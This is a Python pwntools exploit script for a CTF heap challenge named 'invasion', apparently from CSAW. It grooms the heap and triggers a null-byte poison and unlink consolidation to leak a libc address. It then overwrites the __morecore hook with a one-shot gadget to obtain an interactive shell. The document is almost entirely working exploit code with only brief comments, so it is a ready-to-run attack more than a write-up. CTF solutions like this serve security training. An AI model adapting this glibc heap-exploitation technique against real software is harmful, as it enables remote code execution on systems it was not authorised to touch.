from pwn import *

# allocates aliens
def alloc(size, name):
	r.sendlineafter('today.\n', '1')
	r.sendlineafter('name?\n', str(size))
	r.sendafter('name?\n', name)

# deletes alien chunks
def free(idx):
	r.sendlineafter('today.\n', '2')
	r.sendlineafter('mother?\n', str(idx))

# edits alien's name
def edit(idx, data):
	r.sendlineafter('today.\n', '3')
	r.sendlineafter('rename?\n', str(idx))
	r.sendafter('to?\n', data)

def leak(idx):
	r.sendlineafter('today.\n', '3')
	r.sendlineafter('rename?\n', str(idx))
	r.recvuntil('rename ')
	ii = u64(r.recv(6).ljust(8, chr(0)))
	r.sendlineafter('to?\n', '')
	return ii

def ret():
	r.sendlineafter('ka?\n', '3')

def pwn():

	ret()

	alloc(0x150, 'A'*8)  # 0
	alloc(0x150, 'B'*8)  # 1
	alloc(0x150, 'C'*8)  # 2
	alloc(0x150, 'D'*8)  # 3
	alloc(0x90,  'E'*8)  # 4
	alloc(0x90,  'F'*8)  # 5
	alloc(0x90,  'G'*8)  # 6

	free(2)

	alloc(0x50, 'H'*8) # 7

	free(5)

	alloc(0xf0, 'Z'*8) # 8

	free(7)

	# trigger null poison
	alloc(0x58, 'X'*0x48 + p64(0x21) + p64(0x360)) # 9

	free(0)
	# unlink + consolidate
	free(8)

	alloc(0x170, 'J'*8) # 10

	libc = leak(1) - 0x3c4b78
	one_shot = libc + 0xf02a4 
	__morecore = libc + 0x3c53b0
	log.success('Libc: 0x{:x}'.format(libc))

	# overwrite alien #9 name pointer with __morecore hook
	alloc(0x200, 'W'*0x150 + p64(0) + p64(0x21) + p64(__morecore) + p64(0)) # 11
	# __morecore hook => one shot gadget
	edit(9, p64(one_shot))

	# exhaust av->top and trigger sbrk/__morecore.
	# https://github.com/str8outtaheap/heapwn/blob/master/malloc/sysmalloc.c#L224
	# we gotta avoid triggering mmap. its threshold is 0x20000.
	# https://github.com/str8outtaheap/heapwn/blob/master/malloc/sysmalloc.c#L42
	alloc(0x1f000, 'A'*10)
	r.sendlineafter('today.\n', '1')
	r.sendlineafter('name?\n', str(0x1f000))
	
	r.interactive()

if __name__ == "__main__":
	#r = remote('pwn.chal.csaw.io', 9004)
	r = process('./invasion')
	pause()
	pwn()
